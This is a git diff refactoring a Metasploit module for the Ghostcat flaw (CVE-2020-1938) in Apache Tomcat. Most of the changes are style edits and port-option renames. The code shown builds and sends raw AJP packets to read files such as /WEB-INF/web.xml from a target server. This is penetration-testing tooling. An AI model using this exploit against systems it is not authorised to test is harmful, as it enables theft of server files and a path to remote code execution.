@@ -8,7 +8,22 @@ class MetasploitModule < Msf::Auxiliary
         info,
         'Name' => 'Ghostcat',
         'Description' => %q{
-          When using the Apache JServ Protocol (AJP), care must be taken when trusting incoming connections to Apache Tomcat. Tomcat treats AJP connections as having higher trust than, for example, a similar HTTP connection. If such connections are available to an attacker, they can be exploited in ways that may be surprising. In Apache Tomcat 9.0.0.M1 to 9.0.0.30, 8.5.0 to 8.5.50 and 7.0.0 to 7.0.99, Tomcat shipped with an AJP Connector enabled by default that listened on all configured IP addresses. It was expected (and recommended in the security guide) that this Connector would be disabled if not required. This vulnerability report identified a mechanism that allowed: - returning arbitrary files from anywhere in the web application - processing any file in the web application as a JSP Further, if the web application allowed file upload and stored those files within the web application (or the attacker was able to control the content of the web application by some other means) then this, along with the ability to process a file as a JSP, made remote code execution possible. It is important to note that mitigation is only required if an AJP port is accessible to untrusted users. Users wishing to take a defence-in-depth approach and block the vector that permits returning arbitrary files and execution as JSP may upgrade to Apache Tomcat 9.0.31, 8.5.51 or 7.0.100 or later. A number of changes were made to the default AJP Connector configuration in 9.0.31 to harden the default configuration. It is likely that users upgrading to 9.0.31, 8.5.51 or 7.0.100 or later will need to make small changes to their configurations.
+          When using the Apache JServ Protocol (AJP), care must be taken when trusting incoming connections to Apache
+          Tomcat. Tomcat treats AJP connections as having higher trust than, for example, a similar HTTP connection.
+          If such connections are available to an attacker, they can be exploited in ways that may be surprising.
+          In Apache Tomcat 9.0.0.M1 to 9.0.0.30, 8.5.0 to 8.5.50 and 7.0.0 to 7.0.99, Tomcat shipped with an AJP
+          Connector enabled by default that listened on all configured IP addresses. It was expected (and recommended
+          in the security guide) that this Connector would be disabled if not required. This vulnerability report
+          identified a mechanism that allowed: - returning arbitrary files from anywhere in the web application -
+          processing any file in the web application as a JSP Further, if the web application allowed file upload
+          and stored those files within the web application (or the attacker was able to control the content of the
+          web application by some other means) then this, along with the ability to process a file as a JSP, made
+          remote code execution possible. It is important to note that mitigation is only required if an AJP port is
+          accessible to untrusted users. Users wishing to take a defence-in-depth approach and block the vector that
+          permits returning arbitrary files and execution as JSP may upgrade to Apache Tomcat 9.0.31, 8.5.51 or 7.0.100
+          or later. A number of changes were made to the default AJP Connector configuration in 9.0.31 to harden the
+          default configuration. It is likely that users upgrading to 9.0.31, 8.5.51 or 7.0.100 or later will need to
+          make small changes to their configurations.
         },
         'Author' =>
           [
@@ -17,17 +32,18 @@ class MetasploitModule < Msf::Auxiliary
           ],
         'License' => MSF_LICENSE,
         'References' =>
-              [
-                [ 'CVE', '2020-1938']
-              ],
+          [
+            ['CVE', '2020-1938']
+          ],
         'DisclosureDate' => '2020-02-20'
       )
-      )
+    )
     register_options(
       [
+        Opt::RPORT(8080, true, 'The Apache Tomcat webserver port'),
         OptString.new('FILENAME', [true, 'File name', '/WEB-INF/web.xml']),
-        OptBool.new('SSL', [ true, 'SSL', false ]),
-        OptPort.new('PORTWEB', [ false, 'Set a port webserver'])
+        OptBool.new('SSL', [true, 'SSL', false]),
+        OptPort.new('AJP_PORT', [false, 'The Apache JServ Protocol (AJP) port', 8009])
       ]
     )
 
@@ -47,7 +63,7 @@ class MetasploitModule < Msf::Auxiliary
       'PROPFIND' => 8
     }
     code = methods[method]
-    return code
+    code
   end
 
   def make_headers(headers)
@@ -67,21 +83,19 @@ class MetasploitModule < Msf::Auxiliary
       'referer' => "\xA0\x0D",
       'user-agent' => "\xA0\x0E"
     }
-    headers_ajp = Array.new
-    for (header_name, header_value) in headers do
+    headers_ajp = []
+    headers.each do |(header_name, header_value)|
       code = header2code[header_name].to_s
 
-      # rubocop:disable Style/IdenticalConditionalBranches
       if code != ''
         headers_ajp.append(code)
-        headers_ajp.append(ajp_string(header_value.to_s))
       else
         headers_ajp.append(ajp_string(header_name.to_s))
-        headers_ajp.append(ajp_string(header_value.to_s))
       end
-      # rubocop:enable Style/IdenticalConditionalBranches
+      headers_ajp.append(ajp_string(header_value.to_s))
     end
-    return int2byte(headers.length, 2), headers_ajp
+
+    [int2byte(headers.length, 2), headers_ajp]
   end
 
   def make_attributes(attributes)
@@ -96,8 +110,8 @@ class MetasploitModule < Msf::Auxiliary
       'req_attribute' => "\x0A",
       'ssl_key_size' => "\x0B"
     }
-    attributes_ajp = Array.new
-    for attr in attributes
+    attributes_ajp = []
+    attributes.each do |attr|
       name = attr.keys.first.to_s
       code = (attribute2code[name]).to_s
       value = attr[name]
@@ -105,14 +119,15 @@ class MetasploitModule < Msf::Auxiliary
 
       attributes_ajp.append(code)
       if code == "\x0A"
-        for v in value
+        value.each do |v|
           attributes_ajp.append(ajp_string(v.to_s))
-          end
+        end
       else
         attributes_ajp.append(ajp_string(value.to_s))
       end
     end
-    return attributes_ajp
+
+    attributes_ajp
   end
 
   def ajp_string(message_bytes)
@@ -121,9 +136,9 @@ class MetasploitModule < Msf::Auxiliary
 
   def int2byte(data, byte_len = 1)
     if byte_len == 1
-      return [data].pack('C')
+      [data].pack('C')
     else
-      return [data].pack('n*')
+      [data].pack('n*')
     end
   end
 
@@ -143,7 +158,7 @@ class MetasploitModule < Msf::Auxiliary
     else
       is_ssl_boolean = 0
     end
-    server_port_int = datastore['PORTWEB']
+    server_port_int = datastore['RPORT']
     if server_port_int.to_s == ''
       server_port_int = (is_ssl_boolean ^ 1) * 80 + (is_ssl_boolean ^ 0) * 443
     end
@@ -153,7 +168,7 @@ class MetasploitModule < Msf::Auxiliary
     num_headers_bytes, headers_ajp_bytes = make_headers(headers)
 
     attributes_ajp_bytes = make_attributes(attributes)
-    message = Array.new
+    message = []
     message.append(prefix_code_bytes)
     message.append(method_bytes)
     message.append(ajp_string(protocol_bytes.to_s))
@@ -169,13 +184,14 @@ class MetasploitModule < Msf::Auxiliary
     message.append("\xff")
     message_bytes = message.join
     send_bytes = "\x12\x34#{ajp_string(message_bytes.to_s)}"
-    return send_bytes
+
+    send_bytes
   end
 
   def send_recv_once(data)
     buf = ''
     begin
-      connect(true, { 'RHOST' => datastore['RHOST'].to_s, 'RPORT' => datastore['RPORT'].to_i, 'SSL' => datastore['SSL'] })
+      connect(true, { 'RHOST' => datastore['RHOST'].to_s, 'RPORT' => datastore['AJP_PORT'].to_i, 'SSL' => datastore['SSL'] })
       sock.put(data)
       buf = sock.get(30) || ''
     rescue Rex::AddressInUse, ::Errno::ETIMEDOUT, Rex::HostUnreachable, Rex::ConnectionTimeout, Rex::ConnectionRefused, ::Timeout::Error, ::EOFError => e
@@ -183,7 +199,7 @@ class MetasploitModule < Msf::Auxiliary
     ensure
       disconnect
     end
-    return buf
+    buf
   end
 
   def read_buf_string(buf, idx)
@@ -192,7 +208,7 @@ class MetasploitModule < Msf::Auxiliary
     idx += 2
     content += (buf[idx..(idx + len - 1)]).to_s
     idx += len + 1
-    return idx, content
+    [idx, content]
   end
 
   def parse_response(buf, idx)
@@ -222,25 +238,21 @@ class MetasploitModule < Msf::Auxiliary
       header_num = buf[idx..(idx + 2)].unpack('n')[0]
       idx += 2
 
-      # rubocop:disable Style/IdenticalConditionalBranches
-      for _i in 1..header_num
+      (1..header_num).each do |_i|
         if buf[idx] == "\xA0"
           idx += 1
           @header_data += "#{common_response_headers[buf[idx]]}: "
           idx += 1
-          idx, val = read_buf_string(buf, idx)
-          @header_data += val
         else
           idx, val = read_buf_string(buf, idx)
           @header_data += val
           @header_data += ': '
-
-          idx, val = read_buf_string(buf, idx)
-          @header_data += val
         end
+
+        idx, val = read_buf_string(buf, idx)
+        @header_data += val
         @header_data += "\n"
       end
-      # rubocop:enable Style/IdenticalConditionalBranches
     elsif buf[idx] == "\x05"
       return 0
     elsif buf[idx] == "\x03"
@@ -268,7 +280,7 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def run
-    headers = Array.new
+    headers = []
     method = 'GET'
     target_file = datastore['FILENAME'].to_s
     attributes = [
